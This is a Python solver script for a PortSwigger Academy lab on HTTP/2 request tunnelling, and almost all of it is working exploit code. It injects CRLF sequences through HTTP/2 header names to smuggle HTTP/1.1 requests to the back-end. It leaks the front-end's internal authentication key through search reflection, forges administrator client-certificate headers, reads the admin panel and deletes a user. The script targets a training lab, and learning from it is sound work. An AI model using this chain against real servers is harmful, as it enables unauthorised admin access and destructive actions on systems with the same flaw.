#!/usr/bin/env python3
"""Solver for PortSwigger Academy lab: "Bypassing access controls via HTTP/2
request tunnelling" (EXPERT, HTTP request smuggling).

Objective: access /admin as the administrator and delete the user carlos.

Where the vulnerability lives
-----------------------------
The front-end terminates TLS/HTTP-2 and downgrades to HTTP/1.1 for the
back-end, but it does not sanitise header *names* while rewriting. HTTP/2
header names are opaque byte strings, so a name can contain CRLF. The
front-end writes that name verbatim into the HTTP/1.1 header block, which
turns the CRLF into a real line break: full headers — and whole requests —
can be injected from the name field.

The front-end does not reuse back-end connections, so classic smuggling is
useless. Tunnelling still works: the injected request is answered by the
back-end on our own connection, and (because the front-end over-reads the
back-end response for HEAD) its answer is delivered to us inside the body of
our own HTTP/2 response.

The back-end authenticates clients from headers the front-end appends
(X-SSL-VERIFIED, X-SSL-CLIENT-CN, X-FRONTEND-KEY). Those are leaked by
injecting an over-sized Content-Length and a `search` parameter, which makes
the back-end pull the appended headers into the reflected search value.

Flow
----
0. Baseline: read the lab widget (already solved?) and prove /admin is 401.
1. Leak the front-end's client-authentication headers via reflection.
2. Measure how many bytes the back-end returns for a tunnelled GET /admin
   (the front-end reports "Received only N of expected M").
3. Pick an outer HEAD path whose content-length is <= N (largest such path),
   so the over-read can expose as much of the tunnelled response as possible.
4. Tunnel GET /admin with forged auth headers; extract the carlos delete URL.
5. Tunnel GET /admin/delete?username=carlos.
6. Verify authoritatively: re-tunnel /admin (carlos gone) and poll the lab's
   own solved widget until it flips.

Usage:
    uv run python solve.py --url https://<instance>.web-security-academy.net
    uv run python solve.py --url <url> --wait 300

Exit 0 only when the lab reports itself solved (or was already solved) and the
admin panel no longer lists carlos. Exit 2 for bad/expired targets, 1 for a
genuine failure.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import socket
import ssl
import sys
import time
from urllib.parse import urlsplit

import h2.config
import h2.connection
import h2.events
from h2.stream import H2Stream

# The front-end returns tunnelled HTTP/1 bytes as an HTTP/2 DATA frame even
# for HEAD requests. Stock h2 validates HEAD responses against a content
# length of 0 and aborts, so disable that accounting for our connections.
# (This tool only parses lab responses; it never relays untrusted framing.)
H2Stream._track_content_length = lambda self, length, end_stream=False: None  # type: ignore[assignment]

USER_AGENT = "Mozilla/5.0 (PortSwigger solver: h2 request tunnelling)"
STATUS_RE = re.compile(r"widgetcontainer-lab-status\s+(is-solved|is-notsolved)")
TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)
KEY_RE = re.compile(r"X-FRONTEND-KEY:\s*([0-9]{4,})", re.I)


def log(msg: str) -> None:
    print(f"[*] {msg}", flush=True)


def ok(msg: str) -> None:
    print(f"[+] {msg}", flush=True)


def fail(msg: str) -> None:
    print(f"[-] {msg}", flush=True)


class H2Lab:
    """Minimal HTTP/2 client that can put arbitrary bytes in header names."""

    def __init__(self, base_url: str, timeout: float = 25.0) -> None:
        parts = urlsplit(base_url)
        if parts.scheme not in ("http", "https"):
            raise ValueError(f"unsupported scheme: {parts.scheme!r}")
        self.host = parts.hostname or ""
        if not self.host:
            raise ValueError("URL has no host")
        self.port = parts.port or (443 if parts.scheme == "https" else 80)
        self.tls = parts.scheme == "https"
        self.timeout = timeout
        self.requests = 0
        self.evidence_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
        os.makedirs(self.evidence_dir, exist_ok=True)
        self.request_log_path = os.path.join(self.evidence_dir, "requests.jsonl")
        self.event_log_path = os.path.join(self.evidence_dir, "events.jsonl")

    # -- low level ---------------------------------------------------------
    def _connect(self):
        if not self.tls:
            return socket.create_connection((self.host, self.port), timeout=self.timeout)
        ctx = ssl.create_default_context()
        # The lab speaks HTTP/2 but does not advertise it via ALPN, so we
        # negotiate http/1.1 and then send the h2 preface anyway.
        ctx.set_alpn_protocols(["http/1.1"])
        raw = socket.create_connection((self.host, self.port), timeout=self.timeout)
        return ctx.wrap_socket(raw, server_hostname=self.host)

    def request(self, method: str, path: str, extra_headers=None, body: bytes = b"",
                tag: str = "") -> tuple[int | None, list[tuple[str, str]], bytes]:
        """Send one HTTP/2 request on a fresh connection; return (status, headers, data)."""
        headers = [(":method", method), (":scheme", "https" if self.tls else "http"),
                   (":authority", self.host), (":path", path), ("user-agent", USER_AGENT)]
        headers.extend(extra_headers or [])

        cfg = h2.config.H2Configuration(
            client_side=True, header_encoding="utf-8",
            validate_outbound_headers=False, normalize_outbound_headers=False)
        conn = h2.connection.H2Connection(config=cfg)
        sock = None
        status: int | None = None
        resp_headers: list[tuple[str, str]] = []
        data = b""
        try:
            sock = self._connect()
            sock.settimeout(self.timeout)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            sid = conn.get_next_available_stream_id()
            conn.send_headers(sid, headers, end_stream=not body)
            if body:
                conn.send_data(sid, body, end_stream=True)
            sock.sendall(conn.data_to_send())
            self.requests += 1
            while True:
                try:
                    chunk = sock.recv(65535)
                except (socket.timeout, ssl.SSLError, OSError):
                    break
                if not chunk:
                    break
                events = conn.receive_data(chunk)
                done = False
                for ev in events:
                    if isinstance(ev, h2.events.ResponseReceived):
                        resp_headers = [(str(k), str(v)) for k, v in ev.headers]
                        for k, v in ev.headers:
                            if str(k) == ":status":
                                try:
                                    status = int(v)
                                except (TypeError, ValueError):
                                    pass
                    elif isinstance(ev, h2.events.DataReceived):
                        data += ev.data
                        try:
                            conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                        except Exception:  # noqa: BLE001 - stream may already be closed
                            pass
                    elif isinstance(ev, h2.events.StreamEnded):
                        done = True
                if done:
                    break
                out = conn.data_to_send()
                if out:
                    sock.sendall(out)
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        self._record(tag or f"{method} {path}", method, path, extra_headers or [], body,
                     status, resp_headers, data)
        return status, resp_headers, data

    def _record(self, tag, method, path, extra, body, status, resp_headers, data) -> None:
        """Append request/response evidence, redacting session cookies."""
        def scrub(value: str) -> str:
            return re.sub(r"(session=)[^;\s]+", r"\1<redacted>", value)

        entry = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
            "tag": tag,
            "method": method,
            "path": path,
            "injected_header_names": [scrub(n) for n, _ in extra],
            "body_len": len(body),
            "status": status,
            "response_headers": {scrub(k): scrub(v) for k, v in resp_headers},
            "response_len": len(data),
        }
        with open(self.request_log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry) + "\n")
        slug = re.sub(r"[^A-Za-z0-9_.-]+", "_", tag)[:80] or "response"
        with open(os.path.join(self.evidence_dir, f"{slug}.raw"), "wb") as fh:
            fh.write(data)

    def event(self, kind: str, **fields) -> None:
        rec = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"), "event": kind, **fields}
        with open(self.event_log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")

    # -- helpers -----------------------------------------------------------
    def get(self, path: str, tag: str = "") -> tuple[int | None, bytes]:
        status, _, data = self.request("GET", path, tag=tag or f"GET {path}")
        return status, data

    def head_content_length(self, path: str) -> int | None:
        status, headers, data = self.request("HEAD", path, tag=f"HEAD-size {path}")
        for k, v in headers:
            if k.lower() == "content-length":
                try:
                    return int(v)
                except ValueError:
                    return None
        return len(data) or None

    def status_widget(self) -> str:
        _, data = self.get("/", tag="status")
        m = STATUS_RE.search(data.decode("utf-8", "replace"))
        return m.group(1) if m else "unknown"


def tunnel_header(target: str, key: str, outer_path: str) -> tuple[str, str, bytes]:
    """Build the CRLF injection that writes a complete HTTP/1.1 request."""
    name = (
        "x-tunnel: pad\r\n\r\n"
        f"GET {target} HTTP/1.1\r\n"
        "X-SSL-VERIFIED: 1\r\n"
        "X-SSL-CLIENT-CN: administrator\r\n"
        f"X-FRONTEND-KEY: {key}\r\n\r\n"
    )
    return name, "xyz", b""


def tunnel(lab: H2Lab, target: str, key: str, outer_path: str, tag: str):
    name, value, body = tunnel_header(target, key, outer_path)
    return lab.request("HEAD", outer_path, [(name, value)], body=body, tag=tag)


def leak_auth_headers(lab: H2Lab) -> dict:
    """Over-read the front-end's appended client-auth headers via search reflection."""
    variants = [(120, 100), (200, 260), (80, 40)]
    for cl, blen in variants:
        name = f"x-leak: probe\r\nContent-Length: {cl}\r\n\r\nsearch=tunnelprobe"
        body = b"A" * blen
        for attempt in (1, 2):
            try:
                status, _, data = lab.request(
                    "POST", "/?search=tunnelprobe", [(name, "xyz")], body=body,
                    tag=f"leak cl={cl} body={blen} a{attempt}")
            except Exception as exc:  # noqa: BLE001 - transient network errors only
                fail(f"leak request failed ({type(exc).__name__}: {exc}); retrying")
                time.sleep(1.0)
                continue
            text = data.decode("utf-8", "replace")
            m = KEY_RE.search(text)
            if m:
                verified = re.search(r"X-SSL-VERIFIED:\s*(\S+)", text, re.I)
                client_cn = re.search(r"X-SSL-CLIENT-CN:\s*(\S+)", text, re.I)
                leaked = {
                    "frontend_key": m.group(1),
                    "ssl_verified": verified.group(1) if verified else "?",
                    "ssl_client_cn": client_cn.group(1) if client_cn else "?",
                    "content_length": cl,
                    "body_len": blen,
                }
                lab.event("auth_headers_leaked", **leaked)
                return leaked
            if status in (502, 503, 504):
                fail(f"lab instance answered {status}; it may be expired")
            time.sleep(0.5)
    raise RuntimeError("could not leak X-FRONTEND-KEY via search reflection")


def measure_tunnelled_length(lab: H2Lab, key: str) -> int | None:
    """Read the byte count the back-end actually returns for a tunnelled /admin."""
    status, _, data = tunnel(lab, "/admin", key, "/", tag="measure tunnelled-admin")
    text = data.decode("utf-8", "replace")
    m = re.search(r"Received only (\d+) of expected (\d+) bytes", text)
    if m:
        return int(m.group(1))
    # The outer response fit inside the tunnelled response: captured length is
    # the outer content-length, not the tunnelled total.
    if status == 200 and data:
        return None
    return None


def candidate_outer_paths(lab: H2Lab, home: bytes) -> list[tuple[str, int]]:
    """Return (path, content-length) candidates, seeded from real home-page links."""
    paths = ["/login", "/admin"]
    for m in re.finditer(rb'href="(/post\?postId=\d+)"', home):
        paths.append(m.group(1).decode())
    paths.append("/")
    seen, out = set(), []
    for p in paths:
        if p in seen:
            continue
        seen.add(p)
        try:
            cl = lab.head_content_length(p)
        except Exception:  # noqa: BLE001
            continue
        if cl:
            out.append((p, cl))
    return out


def pick_outer(lab: H2Lab, tunnelled_len: int | None, home: bytes) -> str:
    """Largest page whose content-length fits inside the tunnelled response."""
    cands = candidate_outer_paths(lab, home)
    log("candidate outer paths: " + ", ".join(f"{p}={cl}" for p, cl in cands))
    if tunnelled_len:
        fitting = [(p, cl) for p, cl in cands if cl <= tunnelled_len]
        if fitting:
            best = max(fitting, key=lambda x: x[1])
            log(f"tunnelled response is {tunnelled_len} bytes; outer path {best[0]} ({best[1]} B)")
            return best[0]
    return "/login"


def extract_delete_url(admin_body: bytes) -> str | None:
    m = re.search(rb"/admin/delete\?username=carlos", admin_body)
    if m:
        return m.group(0).decode()
    return None


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Solve the HTTP/2 request tunnelling access-control lab")
    ap.add_argument("--url", required=True, help="lab instance base URL")
    ap.add_argument("--wait", type=float, default=180.0,
                    help="seconds to poll the solved widget after the delete (default 180)")
    ap.add_argument("--timeout", type=float, default=25.0, help="per-request socket timeout")
    args = ap.parse_args()

    started = time.time()
    try:
        lab = H2Lab(args.url, timeout=args.timeout)
    except ValueError as exc:
        fail(f"invalid --url: {exc}")
        return 2

    log(f"target: {lab.host}  (HTTP/2 to the front-end, header-name CRLF injection)")

    # ---- 0. baseline -----------------------------------------------------
    try:
        status, home = lab.get("/", tag="baseline")
    except OSError as exc:
        fail(f"cannot reach the instance ({type(exc).__name__}: {exc}) - expired?")
        return 2
    if status != 200 or not home:
        fail(f"baseline GET / returned HTTP {status}; instance unavailable or expired")
        return 2
    title = TITLE_RE.search(home.decode("utf-8", "replace"))
    title = re.sub(r"\s+", " ", title.group(1)).strip() if title else "?"
    log(f"lab title: {title}")
    baseline_widget = STATUS_RE.search(home.decode("utf-8", "replace"))
    baseline_widget = baseline_widget.group(1) if baseline_widget else "unknown"
    log(f"baseline solved widget: {baseline_widget}")
    lab.event("baseline", title=title, widget=baseline_widget)

    admin_status, admin_body = lab.get("/admin", tag="control GET /admin")
    log(f"control GET /admin without auth -> HTTP {admin_status} ({len(admin_body)} bytes)")
    if admin_status == 200 and b"carlos" in admin_body:
        ok("/admin is already reachable without the exploit - instance state is unusual")

    if baseline_widget == "is-solved":
        ok("this instance already reports the lab as solved")
        print("[=] caused by this solver: no (instance was already solved)")
        print(f"[=] requests: {lab.requests}  elapsed: {time.time() - started:.1f}s")
        return 0

    # ---- 1. leak the front-end authentication headers --------------------
    log("leaking the front-end's appended client-authentication headers")
    try:
        leaked = leak_auth_headers(lab)
    except RuntimeError as exc:
        fail(str(exc))
        return 1
    ok(f"leaked X-FRONTEND-KEY={leaked['frontend_key']} "
       f"(X-SSL-VERIFIED={leaked['ssl_verified']}, X-SSL-CLIENT-CN={leaked['ssl_client_cn']})")

    # ---- 2. measure the tunnelled /admin response ------------------------
    log("tunnelling GET /admin to measure the back-end response length")
    try:
        n_bytes = measure_tunnelled_length(lab, leaked["frontend_key"])
    except OSError as exc:
        fail(f"tunnelling request failed: {exc}")
        return 1
    if n_bytes:
        log(f"back-end returned {n_bytes} bytes for the tunnelled /admin")

    # ---- 3. pick the outer path that exposes the most of it --------------
    outer = pick_outer(lab, n_bytes, home)

    # ---- 4. read the admin panel through the tunnel ----------------------
    log(f"tunnelling GET /admin (outer HEAD {outer}) with forged auth headers")
    admin_ok = False
    candidates = [outer] + [p for p in ("/login", "/admin") if p != outer]
    for path in candidates:
        try:
            status, _, data = tunnel(lab, "/admin", leaked["frontend_key"], path,
                                     tag=f"tunnel admin via {path}")
        except OSError as exc:
            fail(f"tunnel via {path} failed: {exc}")
            continue
        nested_ok = b"HTTP/1.1 200" in data or b"HTTP/1.1 302" in data
        delete_url = extract_delete_url(data)
        log(f"outer {path}: h2 status {status}, {len(data)} bytes, "
            f"nested={'yes' if nested_ok else 'no'}, carlos-link={'yes' if delete_url else 'no'}")
        if nested_ok and b"carlos" in data:
            admin_ok = True
            lab.event("admin_panel_read", outer_path=path, bytes=len(data),
                      delete_url=delete_url or "/admin/delete?username=carlos")
            ok(f"read the admin panel as administrator ({len(data)} bytes captured)")
            break

    if not admin_ok:
        fail("could not read the admin panel through the tunnel")
        return 1

    delete_path = "/admin/delete?username=carlos"
    log(f"tunnelling {delete_path} as administrator")
    try:
        status, _, data = tunnel(lab, delete_path, leaked["frontend_key"], outer,
                                 tag="tunnel admin delete carlos")
        log(f"delete tunnel: h2 status {status}, {len(data)} bytes of framing error expected")
    except OSError as exc:
        fail(f"delete tunnel failed: {exc}")
        return 1

    # ---- 5. verify: the panel no longer lists carlos ---------------------
    log("verifying the delete through a fresh tunnelled admin read")
    carlos_gone = False
    for attempt in range(1, 4):
        try:
            _, _, data = tunnel(lab, "/admin", leaked["frontend_key"], outer,
                                tag=f"verify admin attempt {attempt}")
        except OSError as exc:
            fail(f"verification tunnel failed: {exc}")
            data = b""
        if b"HTTP/1.1 200" in data and b"carlos" not in data:
            carlos_gone = True
            ok(f"admin panel no longer lists carlos (attempt {attempt})")
            lab.event("carlos_removed", attempt=attempt)
            break
        time.sleep(2.0)

    # ---- 6. poll the lab's own status widget -----------------------------
    log(f"polling the lab solved widget for up to {args.wait:.0f}s")
    deadline = time.time() + args.wait
    solved = False
    polls = 0
    widget = baseline_widget
    while time.time() < deadline:
        polls += 1
        try:
            widget = lab.status_widget()
        except OSError:
            widget = "unknown"
        if widget == "is-solved":
            solved = True
            break
        if polls == 1 or polls % 5 == 0:
            log(f"  widget={widget} ({time.time() - started:.1f}s elapsed)")
        time.sleep(min(3.0, max(0.5, deadline - time.time())))

    elapsed = time.time() - started
    lab.event("finished", solved=solved, carlos_gone=carlos_gone,
              requests=lab.requests, elapsed=round(elapsed, 1))

    print()
    print(f"[=] lab widget      : {'is-solved' if solved else widget}")
    print(f"[=] carlos deleted  : {'yes' if carlos_gone else 'not verified'}")
    print(f"[=] HTTP requests   : {lab.requests}")
    print(f"[=] elapsed         : {elapsed:.1f}s")
    print(f"[=] evidence        : {lab.evidence_dir}")
    print(f"[=] caused by solver: {'yes' if solved else 'no'}")

    if solved:
        ok("LAB SOLVED - /admin was reached as administrator and carlos was deleted")
        return 0
    if carlos_gone:
        fail("carlos is gone but the lab widget has not flipped yet; rerun with a larger --wait")
        return 1
    fail("exploit chain ran but the delete could not be verified")
    return 1


if __name__ == "__main__":
    sys.exit(main())
